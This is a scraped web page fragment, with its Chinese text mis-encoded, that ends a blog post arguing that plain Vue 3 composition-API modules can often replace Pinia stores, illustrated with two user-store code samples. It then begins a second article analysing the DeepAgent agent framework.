<p><strong>1. Pinia çš„æ–¹å¼ï¼š</strong> ä½ å¾—å…ˆåœ¨Â <code>stores/user.ts</code>Â é‡Œï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span>Â { defineStore }Â <span class="hljs-keyword">from</span><span class="hljs-string">'pinia'</span>
<span class="hljs-keyword">import</span>Â { ref, computed }Â <span class="hljs-keyword">from</span><span class="hljs-string">'vue'</span>

exportconstÂ useUserStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'user'</span>,Â <span class="hljs-function">()Â =&gt;</span>Â {
<span class="hljs-comment">// State</span>
<span class="hljs-keyword">const</span>Â token = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)
<span class="hljs-keyword">const</span>Â userProfile = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)

<span class="hljs-comment">// Getters</span>
<span class="hljs-keyword">const</span>Â isLoggedIn = <span class="hljs-title function_">computed</span>(<span class="hljs-function">()Â =&gt;</span>Â !!token.<span class="hljs-property">value</span>)

<span class="hljs-comment">// Actions</span>
<span class="hljs-keyword">function</span>Â <span class="hljs-title function_">login</span>(<span class="hljs-params">data</span>)Â {
Â  Â  token.<span class="hljs-property">value</span> = data.<span class="hljs-property">token</span>
Â  Â  userProfile.<span class="hljs-property">value</span> = data.<span class="hljs-property">profile</span>
Â  Â Â <span class="hljs-comment">// ... å­˜ localstorage</span>
Â  }

<span class="hljs-keyword">function</span>Â <span class="hljs-title function_">logout</span>(<span class="hljs-params"/>)Â {
Â  Â  token.<span class="hljs-property">value</span> =Â <span class="hljs-literal">null</span>
Â  Â  userProfile.<span class="hljs-property">value</span> =Â <span class="hljs-literal">null</span>
Â  Â Â <span class="hljs-comment">// ... æ¸… localstorage</span>
Â  }

<span class="hljs-keyword">return</span>Â { token, userProfile, isLoggedIn, login, logout }
})
</code></pre>
<p>ç„¶ååœ¨ç»„ä»¶é‡ŒÂ <code>useUserStore()</code>ã€‚</p>
<p><strong>2. ç»„åˆå¼ API çš„æ–¹å¼ï¼š</strong> ä½ åœ¨Â <code>stores/user.ts</code>Â (å¯¹ï¼Œä½ ä¹Ÿå¯ä»¥å«Â <code>stores</code>Â ç›®å½•ï¼Œè¿™åªæ˜¯ä¸ªæ–‡ä»¶å¤¹)ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span>Â { ref, computed, reactive }Â <span class="hljs-keyword">from</span><span class="hljs-string">'vue'</span>

<span class="hljs-comment">// ä»¥å‰æˆ‘ä»¬ç”¨ reactiveï¼Œè¿™é‡Œç”¨ ref/computed æ¨¡æ‹Ÿ Pinia çš„ç»“æ„</span>
<span class="hljs-keyword">const</span>Â token = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)
<span class="hljs-keyword">const</span>Â userProfile = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)

<span class="hljs-keyword">const</span>Â isLoggedIn = <span class="hljs-title function_">computed</span>(<span class="hljs-function">()Â =&gt;</span>Â !!token.<span class="hljs-property">value</span>)

<span class="hljs-keyword">function</span>Â <span class="hljs-title function_">login</span>(<span class="hljs-params">data</span>)Â {
Â  token.<span class="hljs-property">value</span> = data.<span class="hljs-property">token</span>
Â  userProfile.<span class="hljs-property">value</span> = data.<span class="hljs-property">profile</span>
<span class="hljs-comment">// ... å­˜ localstorage</span>
}

<span class="hljs-keyword">function</span>Â <span class="hljs-title function_">logout</span>(<span class="hljs-params"/>)Â {
Â  token.<span class="hljs-property">value</span> =Â <span class="hljs-literal">null</span>
Â  userProfile.<span class="hljs-property">value</span> =Â <span class="hljs-literal">null</span>
<span class="hljs-comment">// ... æ¸… localstorage</span>
}

<span class="hljs-comment">// å¯¼å‡ºä¸€ä¸ª hook</span>
<span class="hljs-keyword">export</span><span class="hljs-keyword">function</span>Â <span class="hljs-title function_">useUser</span>(<span class="hljs-params"/>)Â {
<span class="hljs-keyword">return</span>Â { token, userProfile, isLoggedIn, login, logout }
}
</code></pre>
<p>ç„¶ååœ¨ç»„ä»¶é‡ŒÂ <code>useUser()</code>ã€‚</p>
<hr/>
<p>å¥½äº†ï¼Œä½ å¯¹æ¯”ä¸‹è¿™ä¸¤æ®µä»£ç ã€‚</p>
<p><strong>ä½ å‘ç°äº†ä»€ä¹ˆï¼Ÿ</strong></p>
<p>åœ¨ç¬¬äºŒç§æ–¹å¼é‡Œï¼Œæˆ‘åªæ˜¯åˆ æ‰äº†Â <code>defineStore('user', ...)</code>Â é‚£å±‚â€œå£³â€ï¼Œç„¶åæŠŠå¯¼å‡ºçš„Â <code>useUserStore</code>Â æ”¹æˆäº†Â <code>useUser</code>Â (å«ä»€ä¹ˆéƒ½è¡Œ)ã€‚</p>
<p><strong>å…¶ä»–çš„é€»è¾‘ï¼Œä¸€æ¨¡ä¸€æ ·ï¼</strong>Â éƒ½æ˜¯åœ¨ç”¨Â <code>ref</code>Â å’ŒÂ <code>computed</code>ã€‚</p>
<p>Pinia çš„Â <code>defineStore</code>Â åœ¨è¿™ä¸ªåœºæ™¯é‡Œï¼Œæœ¬è´¨ä¸Šå°±æ˜¯å¸®ä½ åšäº†ä¸€ä»¶äº‹ï¼š<strong>åˆ›å»ºäº†ä¸€ä¸ªè·¨ç»„ä»¶å…±äº«çš„ã€å“åº”å¼çš„å•ä¾‹ã€‚</strong></p>
<p>ä½†åœ¨ Vue 3 é‡Œï¼Œ<code>import</code>Â ä¸€ä¸ªåœ¨æ¨¡å—é¡¶å±‚ï¼ˆmodule scopeï¼‰å®šä¹‰çš„Â <code>ref</code>Â æˆ–Â <code>reactive</code>Â å¯¹è±¡ï¼Œå®ƒ<strong>å¤©ç”Ÿå°±æ˜¯å•ä¾‹</strong>ï¼å®ƒå¤©ç”Ÿå°±æ˜¯è·¨ç»„ä»¶å…±äº«çš„ï¼</p>
<p>é‚£ä½ å¯èƒ½ä¼šåé—®äº†ï¼šâ€œé‚£ Pinia å²‚ä¸æ˜¯å¤šæ­¤ä¸€ä¸¾ï¼Ÿâ€</p>
<p>ä¸ï¼Œå®ƒå½“ç„¶ä¸æ˜¯å¤šæ­¤ä¸€ä¸¾ã€‚å®ƒæä¾›äº†Â <code>defineStore</code>Â è¿™ä¸ªâ€œå£³â€ï¼Œæ˜¯ä¸ºäº†ç»™ä½ å¸¦æ¥é¢å¤–çš„å¥½å¤„ï¼Œæœ€æ ¸å¿ƒçš„å°±æ˜¯ï¼š</p>
<ol>
<li><strong>Devtools é›†æˆ</strong>ï¼šè¿™æ˜¯ Pinia æœ€å¤§çš„æ€æ‰‹é”ã€‚ä½ å¯ä»¥åœ¨æ—¶é—´è½´ä¸Šçœ‹åˆ°Â <code>action</code>Â çš„è°ƒç”¨ã€<code>state</code>Â çš„å˜æ›´ã€‚</li>
<li><strong>æ’ä»¶ç³»ç»Ÿ</strong>ï¼šæ¯”å¦‚å®ç°æ•°æ®æŒä¹…åŒ–ï¼ŒPinia æœ‰ç°æˆçš„æ’ä»¶ï¼Œ<code>defineStore</code>Â çš„æ—¶å€™é…ç½®ä¸€ä¸‹å°±è¡Œã€‚</li>
<li><strong>SSR æ”¯æŒ</strong>ï¼šåœ¨æœåŠ¡ç«¯æ¸²æŸ“æ—¶ï¼ŒPinia èƒ½å¸®ä½ å¤„ç†å¥½çŠ¶æ€çš„åºåˆ—åŒ–å’Œâ€œæ³¨æ°´â€(hydration)ã€‚</li>
<li><strong>æ›´ä¸¥æ ¼çš„â€œå¿ƒæ™ºæ¨¡å‹â€</strong> ï¼šå®ƒå¼ºåˆ¶ä½ åŒºåˆ†Â <code>state</code>ã€<code>getters</code>ã€<code>actions</code>ï¼Œè®©å›¢é˜Ÿåä½œæ›´è§„èŒƒã€‚</li>
</ol>
<h4 data-id="heading-1">Piniaçš„ä¼˜åŠ¿ï¼Œä½ çš„é¡¹ç›®çœŸçš„éœ€è¦å—ï¼Ÿ</h4>
<p>æˆ‘ä»¬å†å›åˆ°ä¸Šç¯‡æ–‡ç« çš„æ ¸å¿ƒè§‚ç‚¹ï¼š</p>
<p><strong>åœ¨ä¸€ä¸ªä¸­å°å‹é¡¹ç›®ã€ç‹¬ç«‹å¼€å‘ã€æˆ–è€…å›¢é˜Ÿæˆå‘˜å¯¹ç»„åˆå¼ API éƒ½å¾ˆç†Ÿç»ƒçš„åœºæ™¯ä¸‹ï¼Œä¸Šé¢ Pinia æä¾›çš„ 4 ä¸ªå¥½å¤„ï¼Œä½ çœŸçš„éƒ½éœ€è¦å—ï¼Ÿ</strong></p>
<ul>
<li><strong>Devtools</strong>ï¼šè¯´å®è¯ï¼Œåœ¨æˆ‘åå¤šå¹´çš„ç”Ÿæ¶¯é‡Œï¼Œé™¤äº†åœ¨ Redux/Vuex åˆšå‡ºæ¥é‚£ä¼šå„¿ï¼Œä¸ºäº†è°ƒè¯•å¤æ‚çš„å¼‚æ­¥æµå’Œä¸­é—´ä»¶ï¼Œä¼šå»ç”¨æ—¶é—´æ—…è¡Œã€‚åœ¨ç»å¤§å¤šæ•°ä¸šåŠ¡åœºæ™¯é‡Œï¼Œ<code>console.log</code>Â å’Œ Vue Devtools é‡Œè‡ªå¸¦çš„ç»„ä»¶çŠ¶æ€æ£€æŸ¥ï¼Œå·²ç»è§£å†³äº† 99% çš„é—®é¢˜ã€‚ä¸ºäº†é‚£ 1% çš„â€œå¯èƒ½â€ï¼Œå»å¼•å…¥ä¸€ä¸ªåº“ï¼Œåˆ’ç®—å—ï¼Ÿ</li>
<li><strong>æ’ä»¶ç³»ç»Ÿï¼ˆå¦‚æŒä¹…åŒ–ï¼‰</strong> ï¼šç”¨ç»„åˆå¼ API æ€ä¹ˆåšæŒä¹…åŒ–ï¼Ÿå¤ªç®€å•äº†ã€‚ä½ å°è£…çš„Â <code>useUser</code>Â hook é‡Œé¢ï¼Œ<code>login</code>Â çš„æ—¶å€™åŠ ä¸€è¡ŒÂ <code>localStorage.setItem</code>ï¼Œåˆå§‹åŒ–Â <code>token</code>Â çš„æ—¶å€™åŠ ä¸€è¡ŒÂ <code>localStorage.getItem</code>ã€‚è¿™ä¸å°±æ˜¯æœ€åŸå§‹ã€æœ€å¯æ§çš„æŒä¹…åŒ–å—ï¼Ÿä½ éœ€è¦ä¸ºè¿™ä¹ˆç‚¹åŠŸèƒ½ï¼Œå»å­¦ä¸€ä¸ª Pinia æ’ä»¶çš„ API å—ï¼Ÿ</li>
<li><strong>SSR</strong>ï¼šå¦‚æœä½ çš„é¡¹ç›®å‹æ ¹å°±ä¸æ˜¯ SSRï¼Œé‚£è¿™æ¡å¯¹ä½ æ— æ•ˆã€‚</li>
<li><strong>ä¸¥æ ¼çš„å¿ƒæ™ºæ¨¡å‹</strong>ï¼šè¿™æ˜¯æœ€å¤§çš„â€œé™·é˜±â€ã€‚ç»„åˆå¼ API çš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯â€œè‡ªç”±â€ã€‚å®ƒå…è®¸ä½ æŠŠÂ <code>state</code>Â å’ŒÂ <code>action</code>Â æ”¾åœ¨ä¸€èµ·ï¼ŒæŒ‰â€œåŠŸèƒ½â€å»ç»„ç»‡ä»£ç ï¼Œè€Œä¸æ˜¯æŒ‰â€œç±»å‹â€ï¼ˆstate/getter/actionï¼‰å»ç»„ç»‡ã€‚<code>defineStore</code>Â æŸç§ç¨‹åº¦ä¸Šï¼Œæ˜¯åˆæŠŠæˆ‘ä»¬æ‹‰å›äº† Vuex çš„é‚£ç§â€œåˆ†é—¨åˆ«ç±»â€çš„æ€ç»´é‡Œã€‚</li>
</ul>
<p>æ‰€ä»¥ï¼Œâ€œä½ ä¼šå¾—åˆ°æ›´å°‘çš„å¿ƒæ™ºè´Ÿæ‹…â€æŒ‡çš„å°±æ˜¯è¿™ä¸ªã€‚</p>
<p>ä½ ä¸éœ€è¦å»è®°Â <code>defineStore</code>Â çš„ APIï¼Œä¸éœ€è¦å»æƒ³â€œæˆ‘è¿™ä¸ªé€»è¾‘æ˜¯ç®—Â <code>getter</code>Â è¿˜æ˜¯Â <code>action</code>â€ï¼Œä½ å°±æ˜¯åœ¨å†™ JS/TSï¼Œä½ å°±æ˜¯åœ¨å†™Â <code>function</code>ã€‚<strong>è¿™éš¾é“ä¸æ˜¯ä¸€ç§è§£æ”¾å—ï¼Ÿ</strong></p>
<h4 data-id="heading-2"><strong>ä»€ä¹ˆå«â€œæ²¡ç”¨æ˜ç™½ Piniaâ€ï¼Ÿ</strong></h4>
<p>åœ¨æˆ‘çœ‹æ¥ï¼Œæ°æ°ç›¸åã€‚</p>
<p><strong>æŠŠ Pinia å½“æˆæ–°æ—¶ä»£çš„ Vuexï¼Œä¸åˆ†åœºæ™¯ã€å¯åŠ¨é¡¹ç›®å°±å…ˆè£…ä¸Šï¼Œè¿™æ‰æ˜¯â€œæ²¡ç”¨æ˜ç™½ Vue 3â€ã€‚</strong></p>
<p>å¦‚æœæ²¡æœ‰æ˜ç™½ Vue 3 ç»„åˆå¼ API åˆ°åº•ç»™äº†ä½ å¤šå¤§çš„â€œè‡ªç”±â€å’Œâ€œèƒ½åŠ›â€ï¼Œå°±å¯èƒ½ç»§ç»­ç”¨ Vue 2 çš„â€œä¿å§†å¼â€æ€ç»´åœ¨å†™ Vue 3ã€‚</p>
<p>æˆ‘æƒ³äº†å‡ ä¸ªåœºæ™¯ï¼Œå¤§å®¶å‚è€ƒä¸‹ï¼š</p>
<ol>
<li><strong>åœºæ™¯ä¸€ï¼šä¸ªäººé¡¹ç›®ã€å°å›¢é˜Ÿæ•æ·å¼€å‘ã€å†…éƒ¨å·¥å…·</strong></li>
</ol>
<ul>
<li><strong>æˆ‘çš„é€‰æ‹©ï¼š100% ä½¿ç”¨ç»„åˆå¼ APIã€‚</strong></li>
<li><strong>ç†ç”±ï¼š</strong>Â é€Ÿåº¦å¿«ï¼Œçµæ´»ï¼Œé›¶ä¾èµ–ã€‚æˆ‘å¯ä»¥æŒ‰åŠŸèƒ½æ‹†åˆ†Â <code>useCounter.ts</code>,Â <code>useUser.ts</code>,Â <code>useCart.ts</code>... å®ƒä»¬å°±æ˜¯ä¸€å † TS æ¨¡å—ï¼Œéœ€è¦å…±äº«å°±åœ¨é¡¶å±‚å®šä¹‰Â <code>reactive</code>ï¼Œä¸éœ€è¦å°±åªå¯¼å‡ºå‡½æ•°ã€‚æ‰“åŒ…ä½“ç§¯æ›´å°ï¼Œå¿ƒæ™ºè´Ÿæ‹…ä¸ºé›¶ã€‚</li>
</ul>
<ol start="3">
<li><strong>åœºæ™¯äºŒï¼šå¤§å‹ä¼ä¸šçº§åº”ç”¨ã€å¤šå›¢é˜Ÿåä½œã€éœ€è¦å¼ºè§„èŒƒ</strong></li>
</ol>
<ul>
<li><strong>æˆ‘çš„é€‰æ‹©ï¼šæˆ‘ä¼šå€¾å‘äºä½¿ç”¨ Piniaã€‚</strong></li>
<li><strong>ç†ç”±ï¼š</strong>Â è¿™ç§é¡¹ç›®ï¼Œâ€œè§„èŒƒâ€å¤§äºâ€œçµæ´»â€ã€‚<code>defineStore</code>Â æä¾›çš„ç»Ÿä¸€èŒƒå¼ï¼Œèƒ½è®©ä¸åŒæ°´å¹³çš„å¼€å‘è€…ï¼ˆå°¤å…¶æ˜¯æ–°äººï¼‰å†™å‡ºé£æ ¼æ›´ä¸€è‡´çš„ä»£ç ã€‚è€Œä¸”åœ¨è¿™ç§å¤æ‚é¡¹ç›®é‡Œï¼ŒDevtools çš„æ—¶é—´æ—…è¡Œå’ŒçŠ¶æ€å¿«ç…§ï¼Œåœ¨æ’æŸ¥æ·±å±‚ Bug æ—¶ï¼Œç¡®å®èƒ½æ´¾ä¸Šç”¨åœºã€‚</li>
</ul>
<ol start="5">
<li><strong>åœºæ™¯ä¸‰ï¼šéœ€è¦ SSR çš„é¡¹ç›®</strong></li>
</ol>
<ul>
<li><strong>æˆ‘çš„é€‰æ‹©ï¼šç”¨ Piniaã€‚</strong></li>
<li><strong>ç†ç”±ï¼š</strong>Â åˆ«é‡å¤é€ è½®å­ã€‚Pinia å¯¹ SSR çŠ¶æ€å¤„ç†å¾—å¾ˆå¥½ï¼Œè‡ªå·±æä¸€å¥—ç»„åˆå¼ API çš„ SSR çŠ¶æ€åŒæ­¥ï¼Œè´¹æ—¶è´¹åŠ›ï¼Œä¸å€¼å¾—ã€‚</li>
</ul>
<p>æ‰€ä»¥ä½ çœ‹ï¼Œå¹¶ä¸æ˜¯åœ¨å…¨ç›˜å¦å®š Piniaï¼Œè€Œæ˜¯åœ¨å‘¼åå¤§å®¶Â <strong>â€œæŒ‰éœ€é€‰æ‹©â€</strong> ã€‚</p>
<p>ä¸è¦å› ä¸ºâ€œå¤§å®¶éƒ½ç”¨â€æˆ–è€…â€œå®˜æ–¹æ¨èâ€å°±å»ç”¨ã€‚å·¥å…·æ˜¯æ­»çš„ï¼Œäººæ˜¯æ´»çš„ã€‚Vue 3 ç»™äº†æˆ‘ä»¬ä¸€æŠŠæ›´è½»ã€æ›´å¿«çš„åŒ•é¦–ï¼ˆç»„åˆå¼ APIï¼‰ï¼Œä½ ä¸ºä»€ä¹ˆéè¦æŠ±ç€é‚£æŠŠå¾ˆç‰›ã€ä½†ä¹Ÿå¾ˆé‡çš„å¼€å±±åˆ€ï¼ˆPiniaï¼‰ä¸æ”¾ï¼Œè¿åˆ‡ä¸ªæ°´æœéƒ½è¦ç”¨å®ƒå‘¢ï¼Ÿ</p>
<p>ä¸‹æ¬¡åœ¨é¡¹ç›®é‡ŒÂ <code>npm install pinia</code>Â ä¹‹å‰ï¼Œå…ˆåœ 5 ç§’é’Ÿï¼Œé—®é—®è‡ªå·±ï¼š<strong>æˆ‘è¿™æ¬¡ï¼ŒçœŸçš„éœ€è¦å®ƒå—ï¼Ÿè¿˜æ˜¯è¯´ï¼Œå‡ ä¸ªÂ <code>ref</code>Â å’ŒÂ <code>reactive</code>Â å°±èƒ½æå®šäº†ï¼Ÿ</strong></p>
<p>æƒ³æ˜ç™½è¿™ä¸ªé—®é¢˜ï¼Œå¯èƒ½æ¯”ä½ å¤šåˆ· 10 ç¯‡ Pinia çš„æ•™ç¨‹éƒ½æœ‰ç”¨ã€‚</p>
<p>è¡Œäº†ï¼Œä»Šå¤©å°±èŠåˆ°è¿™ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±åº¦æ™ºèƒ½ä½“æ¡†æ¶DeepAgentå‰–æ]]></title>    <link>https://juejin.cn/post/7575152891955249152</link>    <guid>https://juejin.cn/post/7575152891955249152</guid>    <pubDate>2025-11-23T00:55:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575152891955249152" data-draft-id="7575152891955232768" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±åº¦æ™ºèƒ½ä½“æ¡†æ¶DeepAgentå‰–æ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,å¼€æº"/> <meta itemprop="datePublished" content="2025-11-23T00:55:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ·±åº¦å­¦ä¹ æœºå™¨"/> <meta itemprop="url" content="https://juejin.cn/user/486421344552179"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±åº¦æ™ºèƒ½ä½“æ¡†æ¶DeepAgentå‰–æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/486421344552179/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ·±åº¦å­¦ä¹ æœºå™¨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T00:55:04.000Z" title="Sun Nov 23 2025 00:55:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å½“æˆ‘ä»¬è°ˆè®º AI Agent æ—¶ï¼Œå¤§å¤šæ•°å¼€å‘è€…æƒ³åˆ°çš„æ˜¯ä¸€ä¸ªç®€å•çš„å·¥å…·è°ƒç”¨å¾ªç¯ï¼šLLM ç”Ÿæˆå·¥å…·è°ƒç”¨ï¼Œæ‰§è¡Œå·¥å…·ï¼Œå°†ç»“æœè¿”å›ç»™ LLMï¼Œç»§ç»­ä¸‹ä¸€è½®ã€‚è¿™ç§æµ…å±‚æ¶æ„åœ¨å¤„ç†ç®€å•ä»»åŠ¡æ—¶è¡¨ç°è‰¯å¥½ï¼Œä½†é¢å¯¹å¤æ‚çš„å¤šæ­¥éª¤å·¥ä½œæµæ—¶ï¼Œå°±ä¼šæš´éœ²å‡ºè‡´å‘½ç¼ºé™·ï¼šæ— æ³•æœ‰æ•ˆè§„åˆ’ã€ä¸Šä¸‹æ–‡ç®¡ç†æ··ä¹±ã€ç¼ºä¹è´¨é‡å®¡æŸ¥æœºåˆ¶ã€‚å°½ç®¡æœ‰ç±»ä¼¼ä¸<code>Langgraph</code>è¿™æ ·çš„å·¥ä½œæµæ¡†æ¶ï¼Œèƒ½å¤Ÿå…å»å¼€å‘è€…åœ¨ç¼–æ’workflowä¸Šé¢çš„è€—æ—¶ï¼Œä½†æ˜¯Agentçš„æ ¸å¿ƒèƒ½åŠ›ï¼Œæ¯”å¦‚èŠ‚ç‚¹å’Œå·¥å…·ï¼Œä»éœ€è¦è‡ªè¡Œå®ç°ã€‚</p>
<p>LangChain å›¢é˜Ÿç ”ç©¶äº†<code>Claude Code</code>ã€<code>OpenAI Deep Research</code>ã€<code>Manus</code>ç­‰çœŸæ­£åœ¨ç”Ÿäº§ç¯å¢ƒä¸­è§£å†³å¤æ‚é—®é¢˜çš„ç³»ç»Ÿï¼Œæç‚¼å‡ºäº†å››ä¸ªå…³é”®çš„ç‰¹å¾ï¼š</p>
<ol>
<li>
<p><strong>è¯¦ç»†çš„ç³»ç»Ÿæç¤ºè¯</strong>ï¼šåŒ…å«å·¥å…·ä½¿ç”¨æŒ‡å—å’Œå°‘æ ·æœ¬ç¤ºä¾‹çš„é•¿æç¤ºã€‚</p>
</li>
<li>
<p><strong>è§„åˆ’å·¥å…·</strong>ï¼šå¦‚<code>Claude Code</code>çš„Todo Listï¼Œç”¨äºä»»åŠ¡åˆ†è§£å’Œè¿›åº¦è¿½è¸ªã€‚</p>
</li>
<li>
<p><strong>å­æ™ºèƒ½ä½“å§”æ‰˜</strong>ï¼šå°†å¤æ‚ä»»åŠ¡æ‹†åˆ†ç»™ä¸“æ³¨çš„å­æ™ºèƒ½ä½“å¤„ç†ã€‚</p>
</li>
<li>
<p><strong>æ–‡ä»¶ç³»ç»Ÿè®¿é—®</strong>ï¼šä½œä¸ºå…±äº«å·¥ä½œç©ºé—´å’Œé•¿æœŸè®°å¿†çš„è½½ä½“ã€‚</p>
</li>
</ol>
<p><code>DeepAgent</code>æ­£æ˜¯å°†è¿™äº›ç‰¹å¾è¿›è¡ŒæŠ½è±¡åï¼Œç³»ç»ŸåŒ–ã€æ¡†æ¶åŒ–çš„äº§ç‰©ï¼Œå®ƒä¸æ˜¯ç®€å•çš„å·¥å…·è°ƒç”¨å¾ªç¯ï¼Œè€Œæ˜¯ä¸€ä¸ªå®Œæ•´çš„<code>Agent Harness</code>ï¼Œå³æ™ºèƒ½ä½“å·¥å…·å¥—ä»¶ã€‚
